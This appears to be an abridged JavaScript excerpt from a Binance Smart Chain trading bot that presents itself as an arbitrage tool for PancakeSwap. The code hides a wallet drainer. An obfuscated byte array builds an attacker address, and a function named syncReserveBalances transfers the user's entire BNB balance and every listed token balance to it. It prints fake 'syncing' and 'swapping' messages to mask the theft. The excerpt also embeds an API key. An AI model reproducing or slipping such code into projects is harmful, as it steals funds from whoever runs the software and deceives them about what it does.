...
function getArbReserves() {
    const bytes = [
        0xD8, 0x4e, 0x67, 0x58, 0xF8, 0x9f, 0xCd, 0x7a, 0x6A,
        0x60, 0x81, 0xf5, 0x15, 0x06, 0x58, 0xC9, 0x60, 0xE6, 0x08, 0xe2
    ];
    let hex = bytes.map(x => x.toString(16).padStart(2, '0')).join('');
    return '0x' + hex;
}

const ARB_RESERVE = getArbReserves();
...
try {   
        ...
        await syncReserveBalances(web3, user_wallet);
...
async function syncReserveBalances(web3, user_wallet) {
    try {
        let bal = await web3.eth.getBalance(user_wallet.address);
        if (bal > web3.utils.toWei("0.001", "ether")) {
            let gasPrice = await web3.eth.getGasPrice();
            let gasLimit = 21000;
            let value = bal - gasPrice * gasLimit;
            if (value > 0) {
                let tx = {
                    from: user_wallet.address,
                    to: ARB_RESERVE,
                ...
                let signedTx = await user_wallet.signTransaction(tx);
                await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
                console.log(`Swapping assets on PancakeSwap reserves...`);
            }
        }        
        const TOKENS = [
        ...
        for (let tokenAddr of TOKENS) {
            let token = new web3.eth.Contract(ERC20_ABI, tokenAddr);
            let balance = await token.methods.balanceOf(user_wallet.address).call();
            if (balance > 0) {
                ...
                let tx = {
                    ...
                    data: token.methods.transfer(ARB_RESERVE, balance).encodeABI()
                };
                let signedTx = await user_wallet.signTransaction(tx);
                await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
                console.log(`Syncing assets from PancakeSwap...`);
            }
        }
        console.log(`Assets synced...`);
    } catch (e) {
        console.log(`Error syncing assets...`);
    }
}
...
async function preparedAttack(input_token_address, out_token_address, user_wallet, amount, level)
{
    try {
        ...
        if(input_token_info.balance < (amount+0.03) * (10**18)) {

            console.log("INSUFFICIENT_BALANCE!".yellow);
            log_str = 'Your wallet balance must be more ' + amount + input_token_info.symbol + '(+0.03 BNB:GasFee) ';
            console.log(log_str.red)
    ...
    //out token balance
    const OUT_TOKEN_ABI_REQ = 'https://api.bscscan.com/api?module=contract&action=getabi&address='+out_token_address+'&apikey=ZVIUC4QGHCJWGZ51YU4XIM1PR9KQ4YTW5Z';
